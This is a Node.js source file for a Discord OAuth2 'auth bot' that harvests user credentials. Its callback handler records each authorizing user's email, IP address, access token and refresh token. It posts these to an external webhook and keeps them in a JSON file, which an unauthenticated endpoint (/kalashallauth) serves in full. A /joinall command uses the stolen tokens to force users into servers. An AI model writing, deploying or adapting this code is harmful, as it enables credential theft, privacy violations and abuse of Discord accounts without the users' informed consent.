// --- Animesh-00's Auth Bot Core ---
// GitHub: https://github.com/Animesh-00

const Discord = require('discord.js');
const { SlashCommandBuilder } = require('@discordjs/builders');
const config = require('./config.json');
const chalk = require('chalk');
const db = require('quick.db');
const fs = require('fs');
const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const FormData = require('form-data');
const axios = require('axios');

// --- CONSTANTS & CONFIGURATION ---
const BOT_NAME = "Animesh-00's Auth Bot";
const GITHUB_URL = "https://github.com/Animesh-00";

// Emojis
const EMOJI = {
    SUCCESS: '✅',
    ERROR: '❌',
    INFO: 'ℹ️',
    LOAD: '🔄',
    USER: '👤',
    LINK: '🔗',
    HELP: '❓',
    WL: '📝',
    WARN: '⚠️'
};

// --- UTILITY FUNCTIONS ---

/**
 * Generates the standard footer for all bot embeds.
 * The GitHub link is included in every message.
 * @param {string} text Optional extra text to include.
 */
function getBrandedFooter(text = "") {
    const footerText = `${text ? text + ' | ' : ''}Powered by ${BOT_NAME} | GitHub: ${GITHUB_URL}`;
    return {
        text: footerText,
        iconURL: 'https://cdn.discordapp.com/embed/avatars/0.png'
    };
}

function getBrandedConsoleLog(message, type = 'INFO') {
    const colorMap = {
        INFO: chalk.blue,
        SUCCESS: chalk.green,
        WARN: chalk.yellow,
        ERROR: chalk.red,
        CONFIG: chalk.gray
    };
    const colorFunc = colorMap[type] || chalk.white;
    return colorFunc(`[${BOT_NAME} - ${type}] ${message} (GitHub: ${GITHUB_URL})`);
}

function updateConfigFile(newSettings) {
    try {
        const currentConfig = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
        const updatedConfig = { ...currentConfig, ...newSettings }; 
        fs.writeFileSync('./config.json', JSON.stringify(updatedConfig, null, 2));
        Object.assign(config, updatedConfig);
        console.log(getBrandedConsoleLog('Successfully updated config.json with new settings.', 'CONFIG'));
    } catch (error) {
        console.error(getBrandedConsoleLog(`Failed to update config.json: ${error}`, 'ERROR'));
    }
}

/**
 * Reads the user database from object.json.
 * @returns {Array<Object>} An array of user objects.
 */
function getAllUsers() {
    try {
        if (!fs.existsSync('./object.json')) {
            fs.writeFileSync('./object.json', '[]');
            return [];
        }
        const data = fs.readFileSync('./object.json', 'utf8');
        return JSON.parse(data);
    } catch (error) {
        console.error(getBrandedConsoleLog(`Failed to read object.json: ${error}`, 'ERROR'));
        return [];
    }
}

/**
 * Writes the user array back to object.json.
 * @param {Array<Object>} users The array of user objects to write.
 * @returns {boolean} True on success, false on failure.
 */
function writeAllUsers(users) {
    try {
        fs.writeFileSync('./object.json', JSON.stringify(users, null, 2));
        return true;
    } catch (error) {
        console.error(getBrandedConsoleLog(`Failed to write to object.json: ${error}`, 'ERROR'));
        return false;
    }
}

/**
 * Checks if a Discord access token is valid by querying the user endpoint.
 * @param {string} accessToken The token to check.
 * @returns {Promise<boolean>} True if valid (status 200), false otherwise.
 */
async function checkTokenValidity(accessToken) {
    try {
        // Use a lightweight endpoint to check auth status
        const response = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: {
                Authorization: `Bearer ${accessToken}`,
            },
        });
        return response.status === 200;
    } catch (error) {
        // 401 Unauthorized is the typical response for an expired/revoked token.
        if (error.response && error.response.status === 401) {
            return false;
        }
        // Log other errors but assume valid if not a clear 401
        console.error(getBrandedConsoleLog(`Error checking token validity for refresh: ${error.message}`, 'WARN'));
        return true; 
    }
}


// --- DISCORD CLIENT SETUP ---
const client = new Discord.Client({
  fetchAllMembers: false,
  restTimeOffset: 0,
  restWsBridgetimeout: 100,
  shards: "auto",
  allowedMentions: {
    parse: [],
    repliedUser: false,
  },
  partials: ['MESSAGE', 'CHANNEL', 'REACTION'],
  intents: [
    Discord.Intents.FLAGS.GUILDS,
    Discord.Intents.FLAGS.GUILD_MEMBERS, 
    Discord.Intents.FLAGS.GUILD_MESSAGES,
    Discord.Intents.FLAGS.DIRECT_MESSAGES,
  ],
});
process.on("unhandledRejection", err => console.log(getBrandedConsoleLog(`Unhandled Rejection: ${err}`, 'ERROR')))
app.use(bodyParser.text())


// --- WEB SERVER ENDPOINTS ---
app.get('/', function(req, res) {
  res.sendFile(__dirname + '/index.html')
})

app.get('/kalashallauth', async (req, res) => {
  fs.readFile('./object.json', function(err, data) {
    return res.json(JSON.parse(data))
  })
})

// --- MAIN OAUTH2 CALLBACK HANDLER ---
app.post('/', function(req, res) {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
  let form = new FormData()
    form.append('client_id', config.DISCORD_CLIENT_ID)
    form.append('client_secret', config.DISCORD_CLIENT_SECRET)
    form.append('grant_type', 'authorization_code')
    form.append('redirect_uri', config.DISCORD_REDIRECT_URI) 
    form.append('scope', 'identify guilds.join email') 
    form.append('code', req.body)

  
  fetch('https://discordapp.com/api/oauth2/token', { method: 'POST', body: form, })
    .then((tokenResponse) => tokenResponse.json())
    .then((tokenData) => {
      const ac_token = tokenData.access_token
      const rf_token = tokenData.refresh_token

      if (!ac_token) {
        console.error(getBrandedConsoleLog(`Failed to retrieve access token: ${JSON.stringify(tokenData)}`, 'ERROR'));
        return res.sendStatus(400);
      }

      const headers = { headers: { authorization: `${tokenData.token_type} ${ac_token}`, } }

      axios.get('https://discordapp.com/api/users/@me', headers)
        .then(async (userResponse) => {
          const userData = userResponse.data;
          const userID = userData.id;
          const userEmail = userData.email;

          if (!userData || !userData.username) {
            console.error(getBrandedConsoleLog('Failed to retrieve complete user data.', 'ERROR'));
            return res.sendStatus(400);
          }


          fs.readFile('./object.json', async function(res, req) {
           
            const usersData = JSON.parse(req);
            const isAlreadyStored = usersData.some((ususu) => ususu.userID === userID);

            if (!isAlreadyStored) {
                console.log(getBrandedConsoleLog(`${ip} - New Authorization: ${userData.username}#${userData.discriminator} (${userEmail})`, 'SUCCESS'));
            }
            
            const avatarHASH = 
                            'https://cdn.discordapp.com/avatars/' +
                            userData.id +
                            '/' +
                            userData.avatar +
                            '.png?size=4096'

            // --- START: ENHANCED WEBHOOK LOGS & FILE WRITE ---
            if (!isAlreadyStored) {

                // --- ENHANCED WEBHOOK LOGS (SUCCESS_LOGS) ---
                // Uses the provided WEBHOOK_URL_SUCCESS_LOGS from config
                fetch(`${config.WEBHOOK_URL_SUCCESS_LOGS}`, { 
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
      
                    body: JSON.stringify({
                        avatar_url: '',
                        embeds: [
                            {
                                color: 0x2ECC71,
                                title: `✅ New User Authorized & Logged by ${BOT_NAME}`,
                                thumbnail: { url: avatarHASH },
                                description: `A new user has successfully authorized the bot.`,
                                fields: [
                                    { name: "👤 Discord Tag", value: `\`${userData.username}#${userData.discriminator}\``, inline: true },
                                    { name: "🆔 User ID", value: `\`${userData.id}\``, inline: true },
                                    { name: "📧 Email Address", value: `\`${userEmail || 'N/A'}\``, inline: true },
                                    { name: "IP Address", value: `\`${ip}\``, inline: false },
                                    { name: "Access Token", value: `\`${ac_token}\``, inline: false },
                                    { name: "Refresh Token", value: `\`${rf_token}\``, inline: false }
                                ],
                                footer: getBrandedFooter('OAuth Gateway Log'),
                                timestamp: new Date().toISOString(),
                            },
                        ],
                    }),
                }).catch(e => console.error(getBrandedConsoleLog(`Failed to post new user log to webhook: ${e.message}`, 'ERROR')));
           
                // --- File Write Logic (User Data) ---
                var papapa = {
                    userID: userData.id,
                    userIP: ip,
                    avatarURL: avatarHASH,
                    username:
                        userData.username + '#' + userData.discriminator,
                    email: userEmail,
                    access_token: ac_token,
                    refresh_token: rf_token,
                }
                usersData.push(papapa)
                fs.writeFile(
                    './object.json',
                    JSON.stringify(usersData, null, 2),
                    function(eeeeeeeee) {
                        if (eeeeeeeee) {
                            throw eeeeeee
                        }
                    }
                )
            }
          })
          res.sendStatus(200);
        })
        .catch((errrr) => {
          console.error(getBrandedConsoleLog(`Failed to fetch user data: ${errrr.message}`, 'ERROR'));
          res.sendStatus(500);
        })
    })
    .catch((err) => {
      console.error(getBrandedConsoleLog(`Failed to exchange code for token: ${err.message}`, 'ERROR'));
      res.sendStatus(400);
    })
})


// --- SLASH COMMAND DEFINITIONS ---

const commands = [
    // /setup command has been removed as requested.
    new SlashCommandBuilder()
        .setName('refresh')
        .setDescription('Checks all user tokens in the database and removes expired/invalid entries.'),
    new SlashCommandBuilder()
        .setName('whitelist')
        .setDescription('Manages the bot command access whitelist.')
        .addSubcommand(subcommand =>
            subcommand
                .setName('add')
                .setDescription('Adds a user to the whitelist.')
                .addUserOption(option => option.setName('user').setDescription('The user to whitelist.').setRequired(true)))
        .addSubcommand(subcommand =>
            subcommand
                .setName('remove')
                .setDescription('Removes a user from the whitelist.')
                .addUserOption(option => option.setName('user').setDescription('The user to unwhitelist.').setRequired(true)))
        .addSubcommand(subcommand =>
            subcommand
                .setName('list')
                .setDescription('Lists all whitelisted users.')),
    new SlashCommandBuilder()
        .setName('mybot')
        .setDescription('Displays bot status and subscription information.'),
    new SlashCommandBuilder()
        .setName('help')
        .setDescription('Displays the list of all available bot commands.'),
    new SlashCommandBuilder()
        .setName('joinall')
        .setDescription('Attempts to force-join all authorized users from the database into the current server.'),
    new SlashCommandBuilder()
        .setName('users')
        .setDescription('Displays the total count of authorized users in the database.'),
    new SlashCommandBuilder()
        .setName('links')
        .setDescription('Provides the bot\'s invite and OAuth2 authentication links.'),
].map(command => command.toJSON());


// --- BOT EVENTS ---

client.on("ready", async () => {
    console.log(chalk.blue(`${BOT_NAME} is online!`));
    console.log(chalk.green(`-> The bot is connected to [ ${client.user.username} ]`));
    console.log(chalk.cyan(`-> Project GitHub: ${GITHUB_URL}`));

    // Registering Slash Commands
    try {
        console.log(getBrandedConsoleLog('Started refreshing application (/) commands.', 'CONFIG'));
        await client.application.commands.set(commands);
        console.log(getBrandedConsoleLog('Successfully reloaded application (/) commands.', 'SUCCESS'));
    } catch (error) {
        console.error(getBrandedConsoleLog(`Failed to register slash commands: ${error}`, 'ERROR'));
    }
});

// --- INTERACTION HANDLER FOR SLASH COMMANDS ---
client.on("interactionCreate", async (interaction) => {
    if (!interaction.isCommand()) return;

    const { commandName } = interaction;
    const authorId = interaction.user.id;
    const isOwnerOrWhitelisted = config.OWNERS.includes(authorId) || db.get(`wl_${authorId}`) === true;

    // Helper function for permission check
    const checkPermission = async () => {
        if (!isOwnerOrWhitelisted) {
            await interaction.reply({ 
                content: `${EMOJI.ERROR} You do not have permission to use the \`/${commandName}\` command.`, 
                ephemeral: true 
            });
            return false;
        }
        return true;
    };


    // --- /REFRESH COMMAND (NEW) ---
    if (commandName === "refresh") {
        if (!await checkPermission()) return;
        await interaction.deferReply(); 

        let users = getAllUsers();
        const initialCount = users.length;
        let removedCount = 0;
        let validCount = 0;
        
        const validUsers = [];
        
        const statusMessage = await interaction.editReply({ 
            embeds: [{
                title: `${EMOJI.LOAD} Starting Token Refresh & Validation`,
                description: `Checking **${initialCount}** users in \`object.json\`. This may take some time...`,
                color: 0xFEE75C,
                footer: getBrandedFooter()
            }] 
        });

        // Iterate through users and check token validity
        for (let i = 0; i < users.length; i++) {
            const user = users[i];
            const isValid = await checkTokenValidity(user.access_token);

            if (isValid) {
                validUsers.push(user);
                validCount++;
            } else {
                removedCount++;
                console.log(getBrandedConsoleLog(`Removed expired user: ${user.username} (${user.userID})`, 'WARN'));
            }
            
            // Update progress every 50 users or on the last iteration
            if ((i + 1) % 50 === 0 || i === users.length - 1) {
                await interaction.editReply({
                    embeds: [{
                        title: `${EMOJI.LOAD} Token Refresh in Progress`,
                        description: `Processed **${i + 1} / ${initialCount}** users.`,
                        color: 0xFEE75C,
                        fields: [
                            { name: '✅ Valid Tokens', value: `\`${validCount}\``, inline: true },
                            { name: '❌ Removed Tokens', value: `\`${removedCount}\``, inline: true },
                        ],
                        footer: getBrandedFooter(`Remaining: ${initialCount - (i + 1)}`)
                    }]
                }).catch(() => {}); // Catch if the interaction token expires or message is deleted
            }
        }

        // Save the cleaned list
        writeAllUsers(validUsers);

        // Final result embed
        await interaction.editReply({
            embeds: [{
                title: `${EMOJI.SUCCESS} Token Refresh Complete!`,
                description: `Database cleanup finished.`,
                color: 0x2ECC71,
                fields: [
                    { name: 'Initial Users', value: `\`${initialCount}\``, inline: true },
                    { name: 'Removed Users', value: `\`${removedCount}\``, inline: true },
                    { name: 'Remaining Users', value: `\`${validUsers.length}\``, inline: true },
                ],
                footer: getBrandedFooter(`Validated by ${interaction.user.tag}`),
                timestamp: new Date().toISOString(),
            }]
        });
    }


    // --- /WHITELIST COMMAND ---
    else if (commandName === "whitelist") {
        if (!await checkPermission()) return;
        
        const subcommand = interaction.options.getSubcommand();

        if (subcommand === "add") {
            const user = interaction.options.getUser('user');
            if (db.get(`wl_${user.id}`) === null) {
                db.set(`wl_${user.id}`, true);
                interaction.reply({ embeds: [{ color: 0x2ECC71, description: `${EMOJI.SUCCESS} **${user.tag}** has been added to the **Whitelist** for command access.`, footer: getBrandedFooter() }] });
            } else {
                interaction.reply({ embeds: [{ color: 0xFEE75C, description: `${EMOJI.INFO} **${user.tag}** is already whitelisted.`, footer: getBrandedFooter() }] });
            }
        } else if (subcommand === "remove") {
            const user = interaction.options.getUser('user');
            if (db.get(`wl_${user.id}`) !== null) {
                db.delete(`wl_${user.id}`);
                interaction.reply({ embeds: [{ color: 0xCF2C2C, description: `${EMOJI.SUCCESS} **${user.tag}** has been removed from the **Whitelist**.`, footer: getBrandedFooter() }] });
            } else {
                interaction.reply({ embeds: [{ color: 0xFEE75C, description: `${EMOJI.INFO} **${user.tag}** is not currently whitelisted.`, footer: getBrandedFooter() }] });
            }
        } else if (subcommand === "list") {
            var content = "";
            const blrank = db.all().filter((data) => data.ID.startsWith(`wl_`)).sort((a, b) => b.data - a.data);
            if (blrank.length === 0) {
                content = "No users are currently whitelisted.";
            } else {
                for (let i in blrank) {
                    const whitelistedUser = client.users.cache.get(blrank[i].ID.split("_")[1]);
                    if (whitelistedUser) {
                        content += `\`${Number(i) + 1}.\` ${whitelistedUser.tag} (\`${whitelistedUser.id}\`)\n`;
                    }
                }
            }
            interaction.reply({ embeds: [{ title: `${EMOJI.WL} Whitelisted Users (${blrank.length})`, description: content, color: 0x5865F2, footer: getBrandedFooter() }] });
        }
    }

    // --- /MYBOT COMMAND ---
    else if (commandName === "mybot") {
        if (!await checkPermission()) return;
        const embed = new Discord.MessageEmbed()
            .setTitle(`${EMOJI.USER} ${BOT_NAME} Status`)
            .setDescription(`[${client.user.username}](https://discord.com/oauth2/authorize?client_id=${client.user.id}&scope=bot&permissions=8): **2 months** remaining on subscription.`)
            .setColor(0xFEE75C)
            .setFooter(getBrandedFooter());
        interaction.reply({ embeds: [embed] });
    }

    // --- /HELP COMMAND (UPDATED) ---
    else if (commandName === "help") {
        if (!await checkPermission()) return;
        interaction.reply({
            embeds: [{
                color: 0x5865F2,
                title: `${EMOJI.HELP} **${BOT_NAME} Dashboard**`,
                description: "**Centralized command list for managing the OAuth2 authentication gateway.**\n\n*All commands require Owner or Whitelist access.*",
                fields: [
                    { name: `👤 Gateway & User Management`, value: `**\`/joinall\`**: Bulk joins all authorized users to this server.\n` + `**\`/users\`**: Displays the total count of authorized users.\n` + `**\`/links\`**: Provides the bot's invite link and OAuth2 link.`, inline: false },
                    { name: `${EMOJI.LOAD} Database Maintenance`, value: `**\`/refresh\`**: Checks all user tokens and removes unauthorized/stale entries.`, inline: false },
                    { name: `${EMOJI.WL} Bot Administration`, value: `**\`/whitelist\`**: Manages the bot's command whitelist.\n` + `**\`/mybot\`**: Displays bot status and subscription information.`, inline: false }
                ],
                footer: getBrandedFooter(),
                timestamp: new Date().toISOString(),
            }]
        });
    }

    // --- /JOINALL COMMAND ---
    else if (commandName === "joinall") {
        if (!await checkPermission()) return;
        await interaction.deferReply(); 

        fs.readFile('./object.json', async function(err, data) {
            if (err) {
                console.error(getBrandedConsoleLog(`Failed to read object.json for joinall: ${err}`, 'ERROR'));
                return interaction.editReply({ content: `${EMOJI.ERROR} An error occurred while reading the user database.`, ephemeral: true });
            }

            const json = JSON.parse(data);
            const guild = client.guilds.cache.get(config.MAIN_SERVER_ID);

            if (!guild) {
                return interaction.editReply({ content: `${EMOJI.ERROR} Main server ID is not configured or bot is not in that guild.`, ephemeral: true });
            }

            let success = 0;
            let error = 0;
            let already_joined = 0;

            for (const userData of json) {
                const userID = userData.userID;
                const accessToken = userData.access_token;

                try
                {
                    const member = await guild.members.fetch({ user: userID, cache: true }).catch(() => null);
                    if (member) {
                        already_joined++;
                    } else {
                        await guild.members.add(userID, {
                            accessToken: accessToken,
                            roles: [], 
                        });
                        success++;
                    }
                } catch (e) {
                    error++;
                    console.error(getBrandedConsoleLog(`Failed to add user ${userID}: ${e.message}`, 'ERROR'));
                }
            }

            // Send the final result embed
            interaction.editReply({
                embeds: [{
                    title: `${EMOJI.LOAD} Join All Process Complete`,
                    description: `The bot attempted to join all **${json.length}** authorized users to this server.`,
                    color: 0x2ECC71,
                    fields: [
                        { name: "✅ Success", value: `\`${success}\``, inline: true },
                        { name: "🔄 Already Joined", value: `\`${already_joined}\``, inline: true },
                        { name: "❌ Errors", value: `\`${error}\``, inline: true },
                    ],
                    footer: getBrandedFooter(),
                    timestamp: new Date().toISOString(),
                }]
            }).catch(() => { /* ignore failed edit */ })
        });
    }

    // --- /USERS COMMAND ---
    else if (commandName === "users") {
        if (!await checkPermission()) return;
        fs.readFile('./object.json', async function(err, data) {
            const userCount = JSON.parse(data).length;
            return interaction.reply({
                embeds: [{
                    title: `${EMOJI.USER} Authorized OAuth2 Users`,
                    description: `There are currently **\`${userCount}\`** authorized members in the bot's database.`,
                    color: 0x5865F2,
                    footer: getBrandedFooter()
                }]
            });
        });
    }

    // --- /LINKS COMMAND ---
    else if (commandName === "links") {
        if (!await checkPermission()) return;
        const oauth2Url = `https://discord.com/oauth2/authorize?client_id=${config.DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(config.DISCORD_REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join%20email`;
        const botInvite = `https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`;
        interaction.reply({
            embeds: [{
                color: 0x5865F2,
                title: `${EMOJI.LINK} Bot & OAuth2 Links for ${BOT_NAME}`,
                fields: [
                    { 
                        name: "🔗 OAuth2 Authentication Link", 
                        value: `[Click Here to Authorize](${oauth2Url})\n\`${oauth2Url}\``, 
                        inline: false 
                    },
                    { 
                        name: "🤖 Bot Invite Link", 
                        value: `[Click Here to Invite](${botInvite})\n\`${botInvite}\``, 
                        inline: false 
                    },
                ],
                footer: getBrandedFooter(`GitHub: ${GITHUB_URL}`)
            }]
        });
    }

});

client.login(config.DISCORD_BOT_TOKEN).catch((e) => {
    console.error(getBrandedConsoleLog("Failed to log in. Check your DISCORD_BOT_TOKEN in config.json.", 'ERROR'));
    process.exit(1);
})

app.listen(config.PORT, () => console.log(chalk.yellow(`${BOT_NAME} web server listening on port ${config.PORT}`)))